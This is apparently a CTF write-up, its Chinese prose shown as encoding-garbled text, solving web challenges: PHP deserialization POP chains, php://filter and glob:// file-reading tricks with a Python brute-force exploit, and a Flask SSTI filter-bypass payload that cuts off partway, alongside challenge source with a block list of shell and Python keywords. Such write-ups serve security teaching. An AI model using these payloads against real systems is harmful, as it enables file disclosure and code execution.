<p>è¿™æ¡popé“¾è¸©äº†å‘ï¼Œç¬¬ä¸€å°±æ˜¯ï¼Œå¯¹è±¡é‡Œåªå†™å±æ€§å€¼ï¼Œä¸è¦å†å†™å…¶ä»–çš„ä¸ç„¶ä¼šæœ‰å½±å“ï¼›</p>
<p><strong>__sleep</strong>: è¯¥å‡½æ•°å¿…é¡»è¿”å›ä¸€ä¸ªéœ€è¦è¿›è¡Œåºåˆ—åŒ–ä¿å­˜çš„æˆå‘˜å±æ€§æ•°ç»„ &#x2F;&#x2F;å¹¶ä¸”åªåºåˆ—åŒ–è¯¥å‡½æ•°è¿”å›çš„è¿™äº›æˆå‘˜å±æ€§</p>
<p><strong>__get</strong>: è·å¾—ä¸€ä¸ªç±»ä¸­ä¸å¯è®¿é—®çš„æˆå‘˜å˜é‡æ—¶(æœªå®šä¹‰æˆ–ç§æœ‰å±æ€§)</p>
<p>åœ¨PHPä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨å¯è°ƒç”¨çš„æ•°ç»„æ¥å°†å¯¹è±¡çš„æ–¹æ³•èµ‹å€¼ç»™å˜é‡ã€‚è¿™å¯ä»¥é€šè¿‡å°†å¯¹è±¡å’Œæ–¹æ³•åä½œä¸ºæ•°ç»„çš„å…ƒç´ æ¥å®ç°ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">myMethod</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hello, world!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line"><span class="variable">$func</span> = [<span class="variable">$obj</span>, <span class="string">&#x27;myMethod&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç°åœ¨ $func å˜é‡åŒ…å«äº† MyClass å¯¹è±¡çš„ myMethod æ–¹æ³•</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// è°ƒç”¨è¯¥æ–¹æ³•</span></span><br><span class="line"><span class="variable">$func</span>();</span><br></pre></td></tr></table></figure>

<p>è¿™æ¡é“¾æœ‰æ„æ€ï¼Œä½¿å¾—å°†<strong>her</strong>å¯¹è±¡çš„<strong>find</strong>å‡½æ•°èµ‹å€¼ç»™<strong>useless</strong>å¯¹è±¡çš„<strong>seeyou</strong>å˜é‡ï¼Œç„¶å$this-&gt;goodä¸ç”¨ç®¡ï¼Œ$this-&gt;goodä¸ºç©ºï¼Œä¼šæ‰§è¡Œ$good().<code>$good</code>æ˜¯ç”±importantå¯¹è±¡ä¼ è¿‡æ¥çš„<code>seeyou</code>,è€Œseeyouå·²ç»è¢«èµ‹å€¼ä¸ºäº†<strong>her</strong>å¯¹è±¡çš„<strong>find</strong>å‡½æ•°ï¼Œå°±ä¼šå»æ‰§è¡Œfindå‡½æ•°ï¼Œ</p>
<p>å†ç”¨dataåè®®ç»•è¿‡ï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=data:text/plain;base64,bG92ZXlvdQ==</span><br></pre></td></tr></table></figure>

<p>å†ç”¨åŸç”Ÿç±»ç»•è¿‡ï¼Œè¿™é“é¢˜ç”¨äº†ä¸¤æ¬¡phpåŸç”Ÿç±»ã€‚</p>
<p><code>GlobIterator</code>å¾—åˆ°flagçš„æ–‡ä»¶åå’Œè·¯å¾„.SplFileObjectè¯»æ–‡ä»¶ï¼Œåªèƒ½è¯»å–æ–‡ä»¶çš„ç¬¬ä¸€è¡Œå†…å®¹ï¼Œé…åˆ<code>php://filter</code>æ‹¿åˆ°æ–‡ä»¶æ‰€æœ‰å†…å®¹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET :fun=./f*</span><br><span class="line">POST: ctf=GlobIterator</span><br><span class="line">#flag_my_baby.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET:fun=php://filter/read=convert.base64-encode/resource=flag_my_baby.php</span><br><span class="line">POST :ctf=SplFileObject</span><br></pre></td></tr></table></figure>



<h2 id="Akane"><a href="#Akane" class="headerlink" title="Akane!"></a>Akane!</h2><h3 id="source-code"><a href="#source-code" class="headerlink" title="source code"></a>source code</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hoshino</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Ruby</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Aquamarine</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Ruby-&gt;<span class="title function_ invoke__">func</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Idol</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Akane</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Akane = <span class="string">&#x27;/var/www/html/The************************.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$Kana</span> = <span class="title function_ invoke__">count</span>(<span class="title function_ invoke__">scandir</span>(<span class="variable">$this</span>-&gt;Akane));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$Kana</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Kurokawa Akane&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Arima Kana&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;tuizi&#x27;</span>]));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>è€ƒçš„åºåˆ—åŒ–ï¼Œpopé“¾ä¹Ÿè¶³å¤Ÿæ˜æ˜¾ :,</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hoshino(__destruct) -&gt; Idol(__call)</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æ²¡æœ‰æ‰¾åˆ°ä»»ä½•å¯ä»¥å‘½ä»¤æ‰§è¡Œçš„åœ°æ–¹ï¼Œç„¶åæˆ‘å°±å»dirsearch ï¼Œä¹Ÿæ²¡æœ‰ä»»ä½•ä¸œè¥¿ï¼›</p>
<p>å†ä»”ç»†åˆ†ææºç ï¼Œpopé“¾è‚¯å®šæ˜¯å›ºå®šçš„è¿™ä¸€ç‚¹ä¸ç”¨æƒ³ï¼Œåˆ†æåˆ†æ<code>__call</code>åˆ°åº•åœ¨å¹²ä»€ä¹ˆï¼Ÿ </p>
<ol>
<li><code>scandir</code>åˆ—å‡º  $this-&gt;Akane ç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•,è¿”å›çš„æ˜¯ä¸€ä¸ªæ•°ç»„</li>
<li><code>count</code> è¿”å›æ•°ç»„ä¸­å…ƒç´ çš„æ•°ç›®</li>
<li>glob:&#x2F;&#x2F; â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</li>
</ol>
<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">count</span>(<span class="title function_ invoke__">scandir</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test002.php?file=glob://f*</span><br><span class="line"></span><br><span class="line">#è¾“å‡ºå¦‚ä¸‹ï¼š</span><br><span class="line">2</span><br><span class="line">array(2) &#123; [0]=&gt; string(4) &quot;flag&quot; [1]=&gt; string(8) &quot;flag.php&quot; &#125;</span><br></pre></td></tr></table></figure>



<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">base_url =<span class="string">&quot;https://jn5lthd6e8wksjfi6mpuosppa.node.game.sycsec.com/?tuizi=&quot;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base64_encode</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="comment"># å°†å­—ç¬¦ä¸²ç¼–ç ä¸º bytes å¯¹è±¡</span></span><br><span class="line">    string_bytes = string.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="comment"># ä½¿ç”¨ base64 æ¨¡å—è¿›è¡Œç¼–ç </span></span><br><span class="line">    encoded_bytes = base64.b64encode(string_bytes)</span><br><span class="line">    <span class="comment"># å°†ç¼–ç åçš„ bytes å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²</span></span><br><span class="line">    encoded_string = encoded_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> encoded_string</span><br><span class="line"></span><br><span class="line">zifu = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    k = i+<span class="number">30</span></span><br><span class="line">    data = <span class="string">f&#x27;O:7:&quot;Hoshino&quot;:2:&#123;&#123;s:4:&quot;Ruby&quot;;O:4:&quot;Idol&quot;:1:&#123;&#123;s:5:&quot;Akane&quot;;s:<span class="subst">&#123;k&#125;</span>:&quot;glob:///var/www/html/The*.php&quot;;&#125;&#125;s:19:&quot;HoshinoAquamarine&quot;;N;&#125;&#125;&#x27;</span></span><br><span class="line">    zz = <span class="string">&quot;glob:///var/www/html/The&quot;</span> +zifu +<span class="string">&quot;*.php&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">len</span>(zz) != k-<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">str</span>)):</span><br><span class="line">        insert_string = zifu+<span class="built_in">str</span>[j]</span><br><span class="line">        <span class="built_in">print</span>(zifu)</span><br><span class="line">        start_index = data.find(<span class="string">&quot;The&quot;</span>+zifu)</span><br><span class="line">        insert_index = data.find(<span class="string">&quot;*.php&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> insert_index != -<span class="number">1</span>:</span><br><span class="line">            <span class="comment"># åœ¨æ‰¾åˆ°çš„ä½ç½®ä¹‹å‰æ’å…¥å­—ç¬¦ä¸²</span></span><br><span class="line">            modified_string = data[:insert_index] + insert_string + data[insert_index:]</span><br><span class="line">            base_data = base64_encode(modified_string)</span><br><span class="line">            url= base_url+base_data</span><br><span class="line">            res = requests.get(url=url)</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">len</span>(res.text) ==<span class="number">4120</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">                zifu=zifu +<span class="built_in">str</span>[j]</span><br><span class="line">                <span class="built_in">print</span>(zifu)</span><br><span class="line">                <span class="comment">#print(url)</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;æœªæ‰¾åˆ°æ’å…¥ä½ç½®&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;å­—ç¬¦:&quot;</span>+zifu)</span><br><span class="line"></span><br><span class="line"><span class="comment">#å­—ç¬¦:S4crEtF1AgFi1EByo2takuXX</span></span><br></pre></td></tr></table></figure>

<p>è®¿é—®TheS4crEtF1AgFi1EByo2takuXX.phpå¾—åˆ°flag</p>
<h2 id="klf-3"><a href="#klf-3" class="headerlink" title="klf_3"></a>klf_3</h2><h3 id="source-code-1"><a href="#source-code-1" class="headerlink" title="source code"></a>source code</h3><p>å†æ¯”èµ›ä¸­æ˜¯çœ‹ä¸åˆ°æºç çš„ï¼Œæ˜¯æˆ‘åæ¥å¯ä»¥rceåï¼Œcat app.pyå¾—åˆ°æºç çš„ï¼Œä¸ºäº†æ–¹ä¾¿å†™wpï¼Œå°±è´´ä¸€ä¸‹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/secr3ttt&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secr3t</span>():</span><br><span class="line"></span><br><span class="line">    name = request.args.get(<span class="string">&#x27;klf&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    template = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">       &lt;html&gt;</span></span><br><span class="line"><span class="string">           &lt;body&gt;</span></span><br><span class="line"><span class="string">               &lt;h1&gt;æ‰¾åˆ°secr3täº†ï¼Œä½†æ˜¯æ‰¾ä¸åˆ°flagä½ è¿˜æ˜¯ä¸ªklf&lt;/h1&gt;</span></span><br><span class="line"><span class="string">               &lt;h1&gt;%s&lt;/h1&gt;         </span></span><br><span class="line"><span class="string">           &lt;/body&gt;</span></span><br><span class="line"><span class="string">       &lt;/html&gt;</span></span><br><span class="line"><span class="string">       &lt;img src=\&quot;https://image-obsidian-1317327960.cos.ap-chengdu.myqcloud.com/obisidian-blog/8.jpg\&quot; alt=&quot;g&quot;&gt;</span></span><br><span class="line"><span class="string">       &lt;!--klf?--&gt;</span></span><br><span class="line"><span class="string">       &lt;!-- klfè¿˜æƒ³è¦flagï¼Ÿæ²¡é‚£ä¹ˆå®¹æ˜“ --&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       &#x27;&#x27;&#x27;</span></span><br><span class="line">    bl = [<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;request&#x27;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;arg&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;app&#x27;</span>, <span class="string">&#x27;self&#x27;</span>, <span class="string">&#x27;cd&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;url&#x27;</span>, <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>, <span class="string">&#x27;base&#x27;</span>, <span class="string">&#x27;pop&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;getitem&#x27;</span>, <span class="string">&#x27;subclasses&#x27;</span>, <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;flashed&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;count&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;43&#x27;</span>, <span class="string">&#x27;45&#x27;</span>, <span class="string">&#x27;38&#x27;</span>, <span class="string">&#x27;124&#x27;</span>, <span class="string">&#x27;47&#x27;</span>, <span class="string">&#x27;59&#x27;</span>, <span class="string">&#x27;99&#x27;</span>, <span class="string">&#x27;100&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;~&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;not&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;length&#x27;</span>, <span class="string">&#x27;index&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;ord&#x27;</span>, <span class="string">&#x27;37&#x27;</span>, <span class="string">&#x27;94&#x27;</span>, <span class="string">&#x27;96&#x27;</span>, <span class="string">&#x27;48&#x27;</span>, <span class="string">&#x27;49&#x27;</span>, <span class="string">&#x27;50&#x27;</span>, <span class="string">&#x27;51&#x27;</span>, <span class="string">&#x27;52&#x27;</span>, <span class="string">&#x27;53&#x27;</span>, <span class="string">&#x27;54&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;55&#x27;</span>, <span class="string">&#x27;56&#x27;</span>, <span class="string">&#x27;57&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;58&#x27;</span>, <span class="string">&#x27;59&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;#&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> bl:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;klf.html&#x27;</span>)</span><br><span class="line">            <span class="comment">#return &quot;çœŸæ˜¯klfï¼ï¼ï¼å›å»å¤šå­¦å­¦å•¦&quot;</span></span><br><span class="line"></span><br><span class="line">    pattern = <span class="string">r&quot;\s*\)\s*\)&quot;</span></span><br><span class="line">    <span class="keyword">match</span> = re.search(pattern, name)</span><br><span class="line">    pattern2 = <span class="string">r&quot;\s*\)\s*(,)?\s*\)&quot;</span></span><br><span class="line">    match2 = re.search(pattern2, name)</span><br><span class="line">    pattern3 = <span class="string">r&quot;\s*\)\s*\)\s*\|&quot;</span></span><br><span class="line">    match3 = re.search(pattern3, name)</span><br><span class="line">    pattern4 = <span class="string">r&quot;\s*,\s*\)\s*\)\s*\|&quot;</span></span><br><span class="line">    match4 = re.search(pattern4, name)</span><br><span class="line"></span><br><span class="line">    pattern_mo = <span class="string">r&quot;\d+\s*%\s*\d+|[a-zA-Z]+\s*%\s*[a-zA-Z]+&quot;</span></span><br><span class="line">    matche_mo = re.search(pattern_mo, name)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        <span class="keyword">if</span> match2.group(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;klf.html&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> match4:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;klf.html&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> match3:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(template % name)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;klf.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è¾“å‡ºåŒ¹é…çš„ç»“æœ</span></span><br><span class="line">    <span class="keyword">if</span> matche_mo :</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;klf.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    a=render_template_string(template % name)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">return</span> a + render_template(<span class="string">&#x27;win.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span>  a</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/robots.txt&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">robots</span>():</span><br><span class="line">    <span class="keyword">return</span> send_from_directory(os.path.join(app.root_path, <span class="string">&#x27;static&#x27;</span>),</span><br><span class="line">                               <span class="string">&#x27;robots.txt&#x27;</span>, mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">7888</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>è¿˜æ˜¯å¯ä»¥ç”¨klf_2çš„è§£æ³•è§£å†³,ä¸å¯ä»¥ç”¨â€œ))â€ï¼Œåªéœ€è¦ä»klf_2çš„expæ”¹ä¸€ä¸‹å°±å¥½äº†ï¼Œä¹Ÿæ˜¯ä¾¥å¹¸æ‹¿äº†ä¸€ä¸ªä¸€è¡€</p>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set po=dict(po=a,p=b)|join%&#125; </span><br><span class="line">&#123;% set a=(()|select|string|list)|attr(po)(24)%&#125;</span><br><span class="line">&#123;% set ini=(a,a,dict(in=a,it=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set glo=(a,a,dict(glo=a,bals=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set cls=(a,a,dict(cla=a,ss=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set bs=(a,a,dict(bas=a,e=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set geti=(a,a,dict(get=a)|join,dict(item=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set subc=(a,a,dict(subcla=a,sses=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set pp=dict(po=a,pen=b)|join 